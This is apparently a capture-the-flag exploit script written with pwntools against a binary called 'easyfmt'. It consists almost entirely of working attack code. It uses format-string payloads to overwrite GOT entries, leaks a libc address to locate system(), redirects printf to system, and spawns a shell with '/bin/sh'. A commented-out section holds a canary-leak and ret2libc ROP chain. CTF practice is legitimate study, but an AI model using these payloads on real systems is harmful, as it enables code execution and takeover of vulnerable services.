
from pwn import *
from ctypes import *
from LibcSearcher import *
context.log_level = 'debug'
# context(arch='i386', os='linux')
context.terminal = ['tmux','splitw','-h']
context(os='linux', arch='amd64', log_level='debug')
def fmt(prev, word, index):
    if prev < word:
        result = word - prev
        fmtstr = "%" + str(result) + "c"
    elif prev == word:
        result = 0
    else:
        result = 256 + word - prev
        fmtstr = "%" + str(result) + "c"
    fmtstr += "%" + str(index) + "$hhn"
    return fmtstr


def fmt_str(offset, size, addr, target):
    payload = ""
    for i in range(4):
        if size == 4:
            payload += p32(addr + i)
        else:
            payload += p64(addr + i)
    prev = len(payload)
    for i in range(4):
        payload += fmt(prev, (target >> i * 8) & 0xff, offset + i)
        prev = (target >> i * 8) & 0xff
    return payload
# sh = process('./ret2libc164')
elf = ELF('./easyfmt')
exitgot=elf.got['exit']
readgot=elf.got['read']
putsplt=elf.plt['puts']
printf_got = elf.got['printf']
ret_addr =0x00400982
# # main_addr = elf.symbols['main']
# main_addr =0x0000000000400908
# rdi = 0x0000000000400a93
# io = remote("111.200.241.244",53030)

io = process("./easyfmt")
# gdb.attach(io)
io.sendlineafter('enter:','1')
io.recvuntil('slogan:')
## %8$n
payload='%' + str(0x982) +'c%10$hn'
payload = payload.ljust(16,'0') + p64(exitgot)
io.sendline(payload)
io.recvuntil('slogan:')
payload = '%10$sBBB' +p64(readgot)
io.sendline(payload)
io.recv()
pause()
# io.recvuntil('slogan: ')
# io.recv(1)

read_addr = u64(io.recvuntil('BBB', drop=True).ljust(8, '\x00'))
# print hex(read_addr)
libc = LibcSearcher('read', read_addr)
libc_base = read_addr - libc.dump('read')
system_addr = libc_base + libc.dump('system')
print('libc_base=', hex(libc_base))
print('system_addr=', hex(system_addr))

#
data = system_addr & 0xFF
print('data:',hex(data))
payload = '%' + str(data) + 'c%14$hhn'
data = ((system_addr & 0xFFFFFF) >> 8) - data
print('data:',hex(data))
payload += '%' + str(data) + 'c%15$hn'
payload = payload.ljust(32, 'B') + p64(printf_got) + p64(printf_got + 1)
payload1 = fmt_str(14,8,printf_got,system_addr)
# payload1 = 'AAAAAAAA%p-%p-%p-%p-%p-%p%p-%p-%p-%p-%p-%p'
io.recvuntil('slogan: ')
io.sendline(payload1)
pause()

# get shell
io.sendlineafter('slogan: ', '/bin/sh')
pause()
# gdb.attach(io)
# io.recv()
# value =0x02223322
# key_addr = 0x0804a048
# payload =  fmt_str(12,4,0x0804a048,0x02223322)
# io.sendline(payload)
# io.sendlineafter('--------\n>> ', '1')
# io.sendline('a' * 0x88)
# info = io.recvline()
# log.info("info => %s", info)
#
# io.sendlineafter('--------\n>> ', '2')
# info = io.recvline()
# log.info("info => %s", info)
# canary = u64(io.recvn(7).rjust(8, '\x00'))
# # log.info("canary => %#x", canary)
# # canary = u64(io.recvn(7).rjust(8,'\x00'))
# print('canary:',hex(canary))
# pause()
# io.sendlineafter('--------\n>> ', '1')
# payload = 'a' * 0x88 + p64(canary) + p64(0) + p64(rdi) + p64(readgot) + p64(putsplt) + p64(main_addr)
# io.sendline(payload)
# io.sendlineafter('--------\n>> ', '3')
# read_addr = u64(io.recv(6).ljust(8,'\x00'))
# print('read_addr :',hex(read_addr))
# libc = LibcSearcher('read', read_addr)
# libc_base = read_addr - libc.dump('read')
# system_addr = libc_base + libc.dump('system')
# binsh_addr = libc_base + libc.dump('str_bin_sh')
# log.info("system_addr => %#x", system_addr)
# log.info("binsh_addr => %#x", binsh_addr)
# io.sendlineafter('--------\n>> ', '1')
# payload = 'a' * 0x88 + p64(canary) + p64(0) + p64(rdi) + p64(binsh_addr) + p64(system_addr) + p64(main_addr)
# io.sendline(payload)
# io.sendlineafter('--------\n>> ', '3')


io.interactive()
